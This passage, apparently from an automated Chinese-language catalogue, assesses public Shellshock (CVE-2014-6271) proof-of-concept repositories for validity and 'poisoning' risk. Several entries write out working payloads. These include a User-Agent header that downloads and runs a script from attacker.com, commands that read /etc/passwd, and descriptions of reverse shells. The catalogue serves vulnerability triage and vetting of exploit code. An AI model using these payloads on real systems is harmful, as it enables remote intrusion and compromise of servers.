4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

